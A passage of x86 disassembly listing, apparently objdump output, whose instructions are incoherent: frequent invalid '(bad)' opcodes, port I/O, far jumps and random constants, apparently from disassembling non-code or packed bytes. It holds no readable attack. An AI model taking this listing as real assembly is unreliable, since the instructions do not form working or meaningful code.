  41549c:	mul    BYTE PTR [eax+0x6f]
  41549f:	lods   eax,DWORD PTR ds:[esi]
  4154a0:	xchg   ebx,eax
  4154a1:	(bad)  
  4154a2:	sbb    ah,ah
  4154a4:	adc    edx,DWORD PTR [eax+0xaf1b013]
  4154aa:	add    BYTE PTR [esi],bh
  4154ac:	scas   al,BYTE PTR es:[edi]
  4154ad:	inc    esp
  4154ae:	pop    esi
  4154af:	iret   
  4154b0:	(bad)  
  4154b1:	jmp    0x3be7ad76
  4154b6:	mov    ds:0x9856e56f,al
  4154bb:	pop    esp
  4154bc:	or     ebp,DWORD PTR [edx-0x73ce5446]
  4154c2:	or     DWORD PTR [edx],ebp
  4154c4:	adc    eax,0x87a45fb6
  4154c9:	bound  edi,QWORD PTR [ebx+0x2c]
  4154cc:	in     eax,dx
  4154cd:	in     eax,0xcf
  4154cf:	sbb    bl,BYTE PTR [edi]
  4154d1:	xor    BYTE PTR [ecx],ah
  4154d3:	sub    bl,BYTE PTR [ebx]
  4154d5:	dec    eax
  4154d6:	dec    esp
  4154d7:	adc    al,0xe3
  4154d9:	inc    esi
  4154da:	je     0x41553d
  4154dc:	and    dh,BYTE PTR [esi+esi*4-0x13]
  4154e0:	call   0x1a50214
  4154e5:	push   esp
  4154e6:	clc    
  4154e7:	inc    ecx
  4154e8:	retf   0xd592
  4154eb:	dec    ebp
  4154ec:	push   ds
  4154ed:	bound  ebp,QWORD PTR [ebx+0x7b3e2f3b]
  4154f3:	jne    0x415499
  4154f5:	add    al,0x37
  4154f7:	(bad)  
  4154f8:	aad    0x4f
  4154fa:	cmp    al,0xb2
  4154fc:	add    eax,0xdf4174bd
  415501:	cdq    
  415502:	(bad)  
  415503:	mov    ch,0x67
  415505:	in     al,0xd
  415507:	loopne 0x4154c5
  415509:	xchg   ebp,eax
  41550a:	outs   dx,BYTE PTR ds:[esi]
  41550b:	cmc    
  41550c:	icebp  
  41550d:	jl     0x4154f6
  41550f:	iret   
  415510:	ret    
  415511:	sub    dh,BYTE PTR [ecx+0xd9e2959]
  415517:	pop    DWORD PTR [eax+edi*2+0x6e008c0e]
  41551e:	adc    eax,0x84a05e06
  415523:	cmp    dh,ch
  415525:	sub    eax,0x29e853e0
  41552a:	repz mov bl,0xe
  41552d:	jp     0x41552c
  41552f:	pop    esi
  415530:	setg   BYTE PTR [ebp-0x1d]
  415534:	sbb    BYTE PTR [edx],al
  415536:	hlt    
  415537:	in     eax,0xe8
  415539:	add    ebp,ebx
  41553b:	aaa    
  41553c:	lods   eax,DWORD PTR ds:[esi]
  41553d:	stos   DWORD PTR es:[edi],eax
  41553e:	pop    esp
  41553f:	jmp    0x41551e
  415541:	cld    
  415542:	scas   al,BYTE PTR es:[edi]
  415543:	mov    eax,0x8d1870f7
  415548:	rol    bh,cl
  41554a:	fstp   DWORD PTR [esi-0x5e]
  41554d:	or     ebx,DWORD PTR [ebp-0x3dba6a9]
  415553:	mov    eax,ds:0x5e833f06
  415558:	inc    esp
  415559:	(bad)  
  41555a:	dec    edi
  41555b:	mov    cl,0xa7
  41555d:	jb     0x415533
  41555f:	xor    esp,0xffffffb8
  415562:	clc    
  415563:	rcr    DWORD PTR [bp+di+0x3c53],1
  415568:	mov    ah,0x8f
  41556a:	pop    ebx
  41556b:	aas    
  41556c:	ins    DWORD PTR es:[edi],dx
  41556d:	xchg   edi,eax
  41556e:	fmul   st(7),st
  415570:	push   edi
  415571:	repz push ebp
  415573:	mov    al,ds:0xc26053d0
  415578:	rcr    DWORD PTR [esp+ebp*4-0x53],cl
  41557c:	in     al,dx
  41557d:	xchg   edx,eax
  41557e:	ja     0x415587
  415580:	mov    ds:0xb0002537,eax
  415585:	call   DWORD PTR [ecx+0x48bb9655]
  41558b:	mov    ss,WORD PTR [ebx+edi*1-0x5d]
  41558f:	mov    ch,0xe2
  415591:	cmp    al,0x53
  415593:	(bad)  
  415594:	mov    ebx,0xaa346be3
  415599:	jge    0x41558c
  41559b:	sub    cl,al
  41559d:	mov    ch,0x18
  41559f:	prefetch BYTE PTR [eax]
  4155a2:	hlt    
  4155a3:	add    BYTE PTR [ecx],dl
  4155a5:	xor    edx,DWORD PTR [ebp-0x1c]
  4155a8:	xor    al,0xc7
  4155aa:	inc    ebp
  4155ab:	dec    ecx
  4155ac:	repnz add BYTE PTR ds:0xcb74b304,0x16
  4155b4:	test   DWORD PTR [ecx+0x6a],ebx
  4155b7:	sar    dl,0x6
  4155ba:	cmp    edx,eax
  4155bc:	(bad)  
  4155bd:	jge    0x4155af
  4155bf:	lods   eax,DWORD PTR ds:[esi]
  4155c0:	inc    ecx
  4155c1:	(bad)  
  4155c2:	in     al,0x52
  4155c4:	or     eax,DWORD PTR [ebp+0xf]
  4155c7:	in     al,0xc3
  4155c9:	dec    eax
  4155ca:	out    0xd9,eax
  4155cc:	and    BYTE PTR fs:[edx+0x2dc1bf26],0x60
  4155d4:	jp     0x4155c3
  4155d6:	jnp    0x41564a
  4155d8:	inc    edi
  4155d9:	(bad)  
  4155da:	fisttp DWORD PTR [edi-0x64]
  4155dd:	outs   dx,DWORD PTR cs:[esi]
  4155df:	ret    
  4155e0:	mov    ah,0xce
  4155e2:	xor    cl,al
  4155e4:	(bad)  
  4155e5:	les    ebp,FWORD PTR [ecx-0x9349fba]
  4155eb:	jecxz  0x415655
  4155ed:	out    dx,al
  4155ee:	clc    
  4155ef:	ja     0x41560d
  4155f1:	push   edx
  4155f2:	push   ecx
  4155f3:	sbb    esp,eax
  4155f5:	mov    eax,ds:0xea93bfa6
  4155fa:	std    
  4155fb:	and    esi,ebx
  4155fd:	(bad)  
  4155fe:	call   0x12db:0xc59d9f18
  415605:	jmp    0x4af955ee
  41560a:	and    al,0x74
  41560c:	jle    0x415638
  41560e:	pop    es
  41560f:	stos   BYTE PTR es:[edi],al
  415610:	mov    eax,ds:0xcb20d1fe
  415615:	or     bl,0x39
  415618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415619:	test   ebx,0xd4ae5f1b
  41561f:	or     eax,0x4c2f41e6
  415624:	fistp  WORD PTR [ecx+esi*8]
  415627:	pusha  
  415628:	std    
  415629:	inc    edi
  41562a:	xchg   edi,eax
  41562b:	push   ebx
  41562c:	jb     0x41568e
  41562e:	mov    edx,0x3ab1144
  415633:	shl    DWORD PTR [edi-0x3f],0xa7
  415637:	(bad)  
  415638:	fimul  DWORD PTR [edi-0x4255bc52]
  41563e:	push   esp
  41563f:	push   ebp
  415640:	cmp    al,cl
  415642:	inc    esi
  415643:	pusha  
  415644:	push   esi
  415645:	test   DWORD PTR [ecx-0x2d05363e],edi
  41564b:	mov    ch,0xae
  41564d:	rcl    BYTE PTR [ebx-0x539d53d2],cl
  415653:	aaa    
  415654:	iret   
  415655:	dec    edx
  415656:	sub    ebp,esp
  415658:	jle    0x41564e
  41565a:	sar    edx,0x1c
  41565d:	sub    DWORD PTR [ecx+0x33662b1d],ebx
  415663:	add    DWORD PTR [ecx+0x31],0xb0305ba6
  41566a:	inc    edx
  41566b:	xor    esp,ebp
  41566d:	push   edx
  41566e:	imul   edi,DWORD PTR [edi],0x6c76fb29
  415674:	or     eax,0x9d4f2426
  415679:	cli    
  41567a:	mov    dh,0x3e
  41567c:	ror    DWORD PTR [esi],0xc5
  41567f:	ror    DWORD PTR [ebx+0x520cae9e],cl
  415685:	cli    
  415686:	add    esp,esi
  415688:	or     cl,BYTE PTR [ebx]
  41568a:	and    al,0xa6
  41568c:	sti    
  41568d:	data16 sub si,bp
  415691:	jnp    0x4156fa
  415693:	ins    DWORD PTR es:[edi],dx
  415694:	stc    
  415695:	dec    ebp
  415696:	hlt    
  415697:	jne    0x4156e0
  415699:	lea    edx,[ebx+0x3092b928]
  41569f:	cs cdq 
  4156a1:	shl    DWORD PTR [ebx+0x29],0x46
  4156a5:	nop
  4156a6:	dec    ebx
  4156a7:	add    BYTE PTR [edx-0x32e55509],bl
  4156ad:	push   0xffffff9c
  4156af:	(bad)  
  4156b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156b1:	lods   al,BYTE PTR ds:[esi]
  4156b2:	jle    0x415693
  4156b4:	inc    ebp
  4156b5:	mov    eax,0x3de33332
  4156ba:	lea    ebx,[eax+0x34]
  4156bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156bf:	test   BYTE PTR [ebx+0x2ef36753],ah
  4156c5:	mov    bh,0x27
  4156c7:	shr    DWORD PTR [eax],1
  4156c9:	cwde   
  4156ca:	and    dl,BYTE PTR [esi+0x2df11e6b]
  4156d0:	ins    DWORD PTR es:[edi],dx
  4156d1:	pusha  
  4156d2:	jnp    0x415732
  4156d4:	add    DWORD PTR [ebx+eiz*1],0xd951fb57
  4156db:	add    al,BYTE PTR [edi]
  4156dd:	fcmovbe st,st(6)
  4156df:	inc    edx
  4156e0:	sub    BYTE PTR [edx+0x6],0x62
  4156e4:	ret    0xfc10
  4156e7:	jmp    0x9eaf:0x6a58364d
  4156ee:	add    BYTE PTR [ebp+0x44],al
  4156f1:	pushf  
  4156f2:	inc    ebx
  4156f3:	xchg   ebp,eax
  4156f4:	aas    
  4156f5:	push   0x2e25026d
  4156fa:	jne    0x415709
  4156fc:	call   0xf8d9c42c
  415701:	jp     0x41577a
  415703:	inc    ebx
  415704:	arpl   WORD PTR [ebx-0x70],bp
  415707:	(bad)  
  415708:	imul   esp,DWORD PTR [eax-0x7c],0x3fdbbc91
  41570f:	js     0x4156ec
  415711:	cmp    eax,0x1756c9f
  415716:	out    dx,eax
  415717:	pop    ebx
  415718:	pop    ebp
  415719:	mov    edi,0xb54edff
  41571e:	mov    cl,0x9d
  415720:	outs   dx,BYTE PTR ds:[esi]
  415721:	add    eax,0xef8305e3
  415726:	mov    ch,0x90
  415728:	cld    
  415729:	push   esi
  41572a:	(bad)  
  41572b:	sub    esp,esi
  41572d:	inc    eax
  41572e:	popf   
  41572f:	in     eax,dx
  415730:	out    0xb5,al
  415732:	xlat   BYTE PTR ds:[ebx]
  415733:	xchg   esi,eax
  415734:	or     al,0xee
  415736:	sub    ecx,ebp
  415738:	jns    0x415714
  41573a:	mov    eax,ds:0xde3aa9e0
  41573f:	push   esi
  415740:	test   al,0xe
  415742:	jmp    0x41578d
  415744:	leave  
  415745:	fstp   DWORD PTR [ecx-0x70]
  415748:	mov    bl,0xb1
  41574a:	(bad)  [edx-0x21]
  41574d:	scas   al,BYTE PTR es:[edi]
  41574e:	mov    esi,0x42022c80
  415753:	jp     0x4157c7
  415755:	ins    BYTE PTR es:[edi],dx
  415756:	cs aas 
  415758:	adc    ebx,ebp
  41575a:	sti    
  41575b:	jp     0x41572b
  41575d:	jecxz  0x415735
  41575f:	push   edi
  415760:	clc    
  415761:	nop
  415762:	pop    ebx
  415763:	sub    edi,esp
  415765:	sbb    BYTE PTR [esi-0x62],dl
  415768:	mov    eax,ds:0xeb1d7fad
  41576d:	(bad)  
  41576e:	sbb    eax,DWORD PTR [esi]
  415770:	out    0x2d,al
  415772:	ins    BYTE PTR es:[edi],dx
  415773:	jp     0x41572d
  415775:	or     ch,bh
  415777:	inc    eax
  415778:	lea    edx,[edi]
  41577a:	sub    esp,DWORD PTR [edx+eiz*4]
  41577d:	lds    esp,FWORD PTR [edi+ecx*8+0x56152e30]
  415784:	jns    0x4157af
  415786:	nop
  415787:	add    eax,0x89c80e85
  41578c:	dec    esp
  41578d:	jge    0x4157c5
  41578f:	adc    eax,0xbbaa3ed9
  415794:	add    esi,DWORD PTR [ecx]
  415796:	xchg   DWORD PTR [ecx+eiz*4+0x3],esi
  41579a:	loope  0x4157ed
  41579c:	lods   eax,DWORD PTR ds:[esi]
  41579d:	scas   eax,DWORD PTR es:[edi]
  41579e:	jmp    0x415792
  4157a0:	retf   0xd3dd
  4157a3:	in     al,0x60
  4157a5:	arpl   WORD PTR [ecx+0x2f3989d1],sp
  4157ab:	mov    eax,0xb345898f
  4157b1:	repnz loop 0x41578c
  4157b4:	push   edx
  4157b5:	fistp  QWORD PTR [edi+0x72]
  4157b8:	mov    ebx,0x365a3bd
  4157bd:	loopne 0x4157af
  4157bf:	pop    esi
  4157c0:	add    DWORD PTR [edi+0x25],eax
  4157c3:	pusha  
  4157c4:	ja     0x41575b
  4157c6:	stos   DWORD PTR es:[edi],eax
  4157c7:	jg     0x4157ac
  4157c9:	scas   al,BYTE PTR es:[edi]
  4157ca:	sub    al,0x3b
  4157cc:	call   0x94fb764d
  4157d1:	mov    ah,0xd0
  4157d3:	int3   
  4157d4:	cmp    eax,0x4d51b552
  4157d9:	pop    ecx
  4157da:	dec    ebx
  4157db:	xor    eax,0xde630815
  4157e0:	jg     0x4157b9
  4157e2:	sbb    edi,DWORD PTR [ebx+esi*8]
  4157e5:	shr    bh,1
  4157e7:	mov    ah,0xf4
  4157e9:	jecxz  0x4157af
  4157eb:	cs sub esi,edx
  4157ee:	inc    BYTE PTR [ebp-0x37088d69]
  4157f4:	fldln2 
  4157f6:	jmp    0x1502:0x91d33f5a
  4157fd:	inc    esp
  4157fe:	sub    DWORD PTR ds:0x5bb8d6e1,edx
  415804:	data16 ins BYTE PTR es:[edi],dx
  415806:	lods   al,BYTE PTR ds:[esi]
  415807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415808:	sbb    al,BYTE PTR [esi]
  41580a:	sbb    BYTE PTR [ebp-0x7613e680],cl
  415810:	adc    BYTE PTR [edx],0xfd
  415813:	sbb    DWORD PTR [ebx-0x1de99925],edi
  415819:	xchg   DWORD PTR [esp+edx*2+0x53],edi
  41581d:	ja     0x415858
  41581f:	test   al,dh
  415821:	jge    0x41581a
  415823:	hlt    
  415824:	(bad)  
  415825:	mov    eax,0xa3c23d4a
  41582a:	retf   
  41582b:	add    edi,edx
  41582d:	scas   eax,DWORD PTR es:[edi]
  41582e:	or     eax,0x62aeee59
  415833:	mov    ecx,0x634cf0f3
  415838:	fild   WORD PTR [ebx]
  41583a:	rcl    BYTE PTR [ebx-0x54],cl
  41583d:	mov    ebx,0x2cf87f00
  415842:	lods   eax,DWORD PTR ds:[esi]
  415843:	and    bl,BYTE PTR [edx-0x765abd85]
  415849:	(bad)  
  41584a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41584b:	test   eax,0x41c489b2
  415850:	xchg   edx,eax
  415851:	push   ds
  415852:	add    al,0xc2
  415854:	ins    DWORD PTR es:[edi],dx
  415855:	fdivr  st,st(3)
  415857:	inc    esp
  415858:	cmc    
  415859:	icebp  
  41585a:	test   cl,0xc1
  41585d:	sub    ch,0x1a
  415860:	push   es
  415861:	push   ecx
  415862:	sub    eax,0x432597dd
  415867:	mov    eax,0x3abf5c8f
  41586c:	dec    DWORD PTR [esp+ecx*1]
  41586f:	add    bh,ah
  415871:	xor    DWORD PTR [esi+0x65],ecx
  415874:	jecxz  0x415850
  415876:	xor    BYTE PTR [edi-0x28840102],al
  41587c:	push   ebp
  41587d:	fld    TBYTE PTR [ebp-0x2e]
  415880:	aaa    
  415881:	xor    eax,0x28918e4c
  415886:	sbb    eax,0x3d282348
  41588b:	pop    eax
  41588c:	ret    0xc32e
  41588f:	rcr    WORD PTR [esp+0x164b1946],1
  415897:	add    BYTE PTR [edi-0x7514e390],al
  41589d:	mov    ebp,0x7333a425
  4158a2:	ja     0x41588d
  4158a4:	xchg   edx,eax
  4158a5:	pop    edx
  4158a6:	addr16 in al,0xfb
  4158a9:	sbb    ecx,DWORD PTR ds:0xc6becbc2
  4158af:	ja     0x4158fb
  4158b1:	mov    esp,DWORD PTR [esi]
  4158b3:	mov    ds:0xcd555a02,al
  4158b8:	sahf   
  4158b9:	test   DWORD PTR [edi],0xb519c77b
  4158bf:	pop    esi
  4158c0:	pop    ecx
  4158c1:	or     DWORD PTR [ebp+eiz*4+0x2b159a58],ecx
  4158c8:	dec    eax
  4158c9:	sub    al,0x65
  4158cb:	cld    
  4158cc:	pop    es
  4158cd:	retf   0x7ca4
  4158d0:	fistp  WORD PTR [eax+0x71]
  4158d3:	cmp    dh,dh
  4158d5:	cld    
  4158d6:	xchg   esi,eax
  4158d7:	add    al,0xa0
  4158d9:	push   edx
  4158da:	enter  0x94dd,0xbc
  4158de:	sub    al,0x55
  4158e0:	pop    edi
  4158e1:	mov    dl,0xb4
  4158e3:	xor    ebx,DWORD PTR [ecx+0x75e5c9b1]
  4158e9:	sbb    dh,BYTE PTR [edx+ebp*8]
  4158ec:	mov    eax,DWORD PTR [ebp+0xc]
  4158ef:	and    edi,edx
  4158f1:	jmp    0x415e03
  4158f6:	aas    
  4158f7:	ret    0x3dce
  4158fa:	rcl    ecx,1
  4158fc:	iret   
  4158fd:	ret    0x3f53
  415900:	dec    ecx
  415901:	xchg   esi,eax
  415902:	mov    eax,0x8a6ec8bb
  415907:	xor    eax,0x7c73787f
  41590c:	js     0x415986
  41590e:	cwde   
  41590f:	out    0x68,eax
  415911:	lods   eax,DWORD PTR ds:[esi]
  415912:	(bad)  
  415914:	xchg   ebx,eax
  415915:	or     ecx,DWORD PTR [eax]
  415917:	(bad)  
  415918:	repnz mov eax,ds:0xccdcf7
  41591e:	sbb    al,0xe8
  415920:	into   
  415921:	pop    edx
  415922:	cmp    cl,ch
  415924:	das    
  415925:	loope  0x4158ca
  415927:	fstp   DWORD PTR [edi+esi*1+0x41]
  41592b:	pusha  
  41592c:	ss ret 
  41592e:	loop   0x41596e
  415930:	mov    ecx,0xd88b9739
  415935:	mov    ds:0xd1c68aad,al
  41593a:	jp     0x4158e5
  41593c:	jmp    DWORD PTR [edi-0x2fe40ee]
  415942:	add    DWORD PTR [edi+0x7e],0xffffffb1
  415946:	jmp    0x3b17b67c
  41594b:	xchg   BYTE PTR [edx],bh
  41594d:	jbe    0x4159b2
  41594f:	cmp    edx,DWORD PTR [ecx]
  415951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415952:	cdq    
  415953:	popf   
  415954:	jno    0x41598f
  415956:	into   
  415957:	loop   0x415944
  415959:	into   
  41595a:	rcr    DWORD PTR [ebp-0x77],1
  41595d:	add    ecx,ebp
  41595f:	std    
  415960:	dec    esi
  415961:	int3   
  415962:	test   DWORD PTR [ebx+0xdd89fdc],ebx
  415968:	mov    ds:0xb20a3aaf,eax
  41596d:	cmp    eax,0x5815d8ed
  415972:	xor    DWORD PTR [ebx],eax
  415974:	cmp    BYTE PTR [edi+0x7b],0xad
  415978:	je     0x415950
  41597a:	or     ecx,edx
  41597c:	out    dx,al
  41597d:	outs   dx,DWORD PTR ds:[esi]
  41597e:	int3   
  41597f:	push   DWORD PTR [ecx+0x3bb76269]
  415985:	je     0x4159ef
  415987:	pop    ebp
  415988:	(bad)  
  415989:	push   cs
  41598a:	add    eax,0xbd0418
  41598f:	mov    DWORD PTR [esi+edi*4],edx
  415992:	push   eax
  415993:	addr16 push ecx
  415995:	bound  edi,QWORD PTR [eax+0x51]
  415998:	popf   
  415999:	adc    DWORD PTR [eax+edx*8+0x39],edx
  41599d:	adc    edx,edx
  41599f:	pop    edx
  4159a0:	test   BYTE PTR [edi],bl
  4159a2:	loop   0x415989
  4159a4:	pop    edx
  4159a5:	inc    ebp
  4159a6:	pop    es
  4159a7:	vcmppd ymm5,ymm1,YMMWORD PTR [ecx],0xb1
  4159ac:	leave  
  4159ad:	sbb    ebx,DWORD PTR [edi]
  4159af:	adc    al,BYTE PTR [eax+0xcdd87e1]
  4159b5:	xchg   esi,eax
  4159b6:	sbb    DWORD PTR [edx-0x61],esi
  4159b9:	das    
  4159ba:	popf   
  4159bb:	sbb    ebp,DWORD PTR [ebx+0xa7405e5]
  4159c1:	cdq    
  4159c2:	push   edx
  4159c3:	stc    
  4159c4:	(bad)  
  4159c5:	std    
  4159c6:	pop    ecx
  4159c7:	scas   eax,DWORD PTR es:[edi]
  4159c8:	fisub  DWORD PTR [eax+0x1a18f6bc]
  4159ce:	popa   
  4159cf:	or     cl,cl
  4159d1:	ds popa 
  4159d3:	hlt    
  4159d4:	sbb    DWORD PTR [ebx-0x2a8f845],ecx
  4159da:	in     al,0x1a
  4159dc:	jne    0x415996
  4159de:	sti    
  4159df:	cmp    eax,0xbcb5bcfb
  4159e4:	scas   eax,DWORD PTR es:[edi]
  4159e5:	addr16 in eax,dx
  4159e7:	cmp    ecx,DWORD PTR [eax+0x67007aed]
  4159ed:	cmp    edx,DWORD PTR [ebx-0x23]
  4159f0:	in     eax,0x21
  4159f2:	xor    edi,DWORD PTR [ebx-0x8]
  4159f5:	in     al,0xb6
  4159f7:	mov    eax,0xd225fde5
  4159fc:	cvttps2pi mm1,QWORD PTR [eax+0x17]
  415a00:	or     DWORD PTR [eax+0x6808ae05],ecx
  415a06:	sub    ebp,esp
  415a08:	and    DWORD PTR [ebp+0x67],ecx
  415a0b:	cdq    
  415a0c:	ins    DWORD PTR es:[edi],dx
  415a0d:	aas    
  415a0e:	fadd   DWORD PTR [ebp+eiz*2-0x35ead3a9]
  415a15:	xor    al,0x93
  415a17:	inc    edi
  415a18:	push   esp
  415a19:	fisttp DWORD PTR ds:0x5b3f0cd3
  415a1f:	jmp    0xd71f:0x13e76531
  415a26:	mov    al,BYTE PTR [edi]
  415a28:	aaa    
  415a29:	daa    
  415a2a:	sbb    eax,0x5eba4348
  415a2f:	cs adc al,0xae
  415a32:	and    bh,ah
  415a34:	push   ecx
  415a35:	enter  0x55a5,0x34
  415a39:	mov    ebx,0xcaf1336d
  415a3e:	xchg   esi,eax
  415a3f:	pop    edx
  415a40:	adc    bh,BYTE PTR [esi+0x7c]
  415a43:	xchg   ecx,eax
  415a44:	sub    BYTE PTR [ecx],0x91
  415a47:	jg     0x4159ff
  415a49:	retw   0x503b
  415a4d:	adc    edi,eax
  415a4f:	nop    ecx
  415a52:	shl    BYTE PTR [ecx],0x3a
  415a55:	arpl   WORD PTR [ebp+edx*8-0x31],bx
  415a59:	ss push ecx
  415a5b:	std    
  415a5c:	scas   al,BYTE PTR es:[edi]
  415a5d:	data16 fisttp WORD PTR [ecx]
  415a60:	bound  esi,QWORD PTR [eax-0x33b5cd58]
  415a66:	retf   
  415a67:	repz mov ds:0x41664414,al
  415a6d:	and    BYTE PTR [ebx+0x78],al
  415a70:	jmp    0x415acf
  415a72:	scas   al,BYTE PTR es:[edi]
  415a73:	mov    DWORD PTR [edx+0x3f1461aa],ebp
  415a79:	adc    eax,0xcc48b267
  415a7e:	mov    al,ds:0xf4c695d2
  415a83:	lds    eax,FWORD PTR [ebp+0x3c1c7150]
  415a89:	inc    esi
  415a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a8c:	aaa    
  415a8d:	sub    eax,esp
  415a8f:	fidiv  DWORD PTR [edi]
  415a91:	sub    DWORD PTR [edi-0x13],0x9262803
  415a98:	adc    eax,0xcb19bfc1
  415a9d:	or     al,0xb2
  415a9f:	jmp    0x415b1f
  415aa1:	call   0x9a6a:0xcbf7c306
  415aa8:	mov    ebp,0x21128270
  415aad:	jb     0x415aa4
  415aaf:	mov    edi,0xb4a94c1c
  415ab4:	test   DWORD PTR ds:0x1633bf39,0x51311d3
  415abe:	jmp    0xe693d1e1
  415ac3:	push   cs
  415ac4:	push   0x807ded1d
  415ac9:	in     eax,0x6b
  415acb:	jns    0x415a97
  415acd:	in     eax,0xe6
  415acf:	xchg   edi,eax
  415ad0:	loopne 0x415ab1
  415ad2:	jg     0x415ab6
  415ad4:	std    
  415ad5:	mov    eax,0xb231cb80
  415ada:	and    al,0x83
  415adc:	dec    ebp
  415add:	cmp    BYTE PTR [edi+edx*1-0x29],ch
  415ae1:	dec    eax
  415ae2:	mov    BYTE PTR [edx],ah
  415ae4:	mov    BYTE PTR [edx+0xe6fd29b],0xee
  415aeb:	arpl   WORD PTR [edx],di
  415aed:	outs   dx,BYTE PTR ds:[esi]
  415aee:	lock xchg esp,eax
  415af0:	loop   0x415a8e
  415af2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  415af4:	in     al,dx
  415af5:	iret   
  415af6:	pop    ebp
  415af7:	mov    ebx,0x19c4a7a5
  415afc:	inc    esp
  415afd:	dec    DWORD PTR [esi]
  415aff:	sub    al,0xca
  415b01:	stc    
  415b02:	mov    ds:0xa273ae4e,al
  415b07:	sti    
  415b08:	cmp    eax,0x9d21cd58
  415b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b0e:	std    
  415b0f:	pop    ss
  415b10:	mov    eax,0x73a4094f
  415b15:	aad    0x56
  415b17:	adc    al,0x80
  415b19:	mov    WORD PTR [ebx],ds
  415b1b:	(bad)  
  415b1c:	sahf   
  415b1d:	lods   al,BYTE PTR ds:[esi]
  415b1e:	and    eax,ecx
  415b20:	sbb    al,0xf2
  415b22:	xchg   esi,eax
  415b23:	jg     0x415b45
  415b25:	pop    edi
  415b26:	mov    al,ds:0x21b728b5
  415b2b:	inc    edx
  415b2c:	loope  0x415b54
  415b2e:	xchg   ecx,eax
  415b30:	mov    dh,0xf7
  415b32:	aad    0xae
  415b34:	add    bl,BYTE PTR [esi]
  415b36:	push   0x57e198af
  415b3b:	test   al,0x82
  415b3d:	or     BYTE PTR [ebp+ecx*8+0x15e9e047],bh
  415b44:	sbb    al,0x8d
  415b46:	ds out 0xda,al
  415b49:	ret    0xeee3
  415b4c:	jae    0x415b25
  415b4e:	xor    al,0x9e
  415b50:	dec    ebp
  415b51:	sti    
  415b52:	xchg   ecx,eax
  415b53:	fist   WORD PTR [eax+eiz*2+0x1a]
  415b57:	jo     0x415b78
  415b59:	shr    DWORD PTR [ebp+0xe67918a],cl
  415b5f:	and    ebp,DWORD PTR [edx-0x39165b51]
  415b65:	dec    ebx
  415b66:	xchg   ebp,eax
  415b67:	int3   
  415b68:	popa   
  415b69:	loope  0x415b9b
  415b6b:	cmp    BYTE PTR [eax],al
  415b6d:	(bad)  
  415b6e:	mov    ds:0x54b440e1,al
  415b73:	div    DWORD PTR [esi+0x8]
  415b76:	sbb    al,0xdd
  415b78:	xor    BYTE PTR [edx+0x7b],cl
  415b7b:	rcl    BYTE PTR [eax],0xe
  415b7e:	xchg   BYTE PTR [ebp+0x77],cl
  415b81:	mov    BYTE PTR [eax],0xc5
  415b84:	xchg   edx,eax
  415b85:	adc    BYTE PTR [ebp+0x19eb31c7],dl
  415b8b:	jl     0x415b9c
  415b8d:	sub    dh,BYTE PTR [ebp+0x10510748]
  415b93:	push   0x30
  415b95:	add    DWORD PTR [edi-0x400658ab],0x38
  415b9c:	daa    
  415b9d:	add    DWORD PTR [esi-0x23],edx
  415ba0:	enter  0xff3f,0x1e
  415ba4:	add    ebp,esp
  415ba6:	das    
  415ba7:	sub    edx,DWORD PTR [edi-0x7cf118ec]
  415bad:	aas    
  415bae:	into   
  415baf:	add    eax,ebx
  415bb1:	adc    eax,0x7d17e2dc
  415bb6:	cli    
  415bb7:	jns    0x415bee
  415bb9:	rep ins BYTE PTR es:[edi],dx
  415bbb:	xor    bh,cl
  415bbd:	sub    al,0xb7
  415bbf:	jmp    0xd9c9:0x9855df3a
  415bc6:	shl    BYTE PTR [ebx-0x63],1
  415bc9:	mov    WORD PTR [esi],ss
  415bcb:	ret    
  415bcc:	xor    al,0x64
  415bce:	sub    BYTE PTR [eax-0x33],cl
  415bd1:	push   ebx
  415bd2:	mov    ecx,0xf2a78993
  415bd7:	(bad)  
  415bd8:	sbb    eax,0x2d825d3
  415bdd:	data16 rcr BYTE PTR [edx],1
  415be0:	and    DWORD PTR [ecx+ebx*1+0x13f12e64],0xe6346618
  415beb:	dec    ebx
  415bec:	ds and al,0xe0
  415bef:	pop    ds
  415bf0:	push   0x4
  415bf2:	adc    ebp,ebp
  415bf4:	dec    eax
  415bf5:	lock and al,0x56
  415bf8:	test   ecx,ecx
  415bfa:	fcmovne st,st(7)
  415bfc:	add    eax,0xf87ea247
  415c01:	call   0x190c6e1
  415c06:	lahf   
  415c07:	test   BYTE PTR [esi],ah
  415c09:	dec    ecx
  415c0a:	pop    ebp
  415c0b:	mov    bl,0xa1
  415c0d:	pmaxub mm7,QWORD PTR gs:[ebx+0x5]
  415c12:	shl    ecx,cl
  415c14:	cmp    esp,0xfffffff8
  415c17:	pop    ebp
  415c18:	retf   0x7862
  415c1b:	sbb    DWORD PTR ds:0x53f50b3d,ebp
  415c21:	pop    edi
  415c22:	and    edx,DWORD PTR [esi+0x19d6adab]
  415c28:	sub    DWORD PTR [ebx+ebp*8-0x65a9cd86],edi
  415c2f:	arpl   WORD PTR [eax],bx
  415c31:	hlt    
  415c32:	pop    ebx
  415c33:	mov    ah,0xe0
  415c35:	jl     0x415bd2
  415c37:	mov    ds:0x215d0845,al
  415c3c:	test   al,0x87
  415c3e:	xchg   edi,eax
  415c3f:	daa    
  415c40:	hlt    
  415c41:	dec    ebx
  415c42:	push   ecx
  415c43:	lahf   
  415c44:	in     eax,0xa3
  415c46:	push   ebp
  415c47:	pop    es
  415c48:	adc    BYTE PTR [ecx-0x66],bl
  415c4b:	cdq    
  415c4c:	cmc    
  415c4d:	mov    BYTE PTR [ecx],0x65
  415c50:	ss aaa 
  415c52:	dec    edi
  415c53:	cdq    
  415c54:	mul    ecx
  415c56:	adc    al,0x36
  415c58:	ds out 0xaf,al
  415c5b:	fmul   st(3),st
  415c5d:	jns    0x415c28
  415c5f:	hlt    
  415c60:	addr16 xchg ebp,eax
  415c62:	inc    ebp
  415c63:	lea    ecx,[ebp+ebx*2-0x7fd24e38]
  415c6a:	pushf  
  415c6b:	popf   
  415c6c:	enter  0x84bf,0x97
  415c70:	and    edx,DWORD PTR [ebx-0x1c9781db]
  415c76:	sbb    al,0x46
  415c78:	mov    edi,0x5903dc49
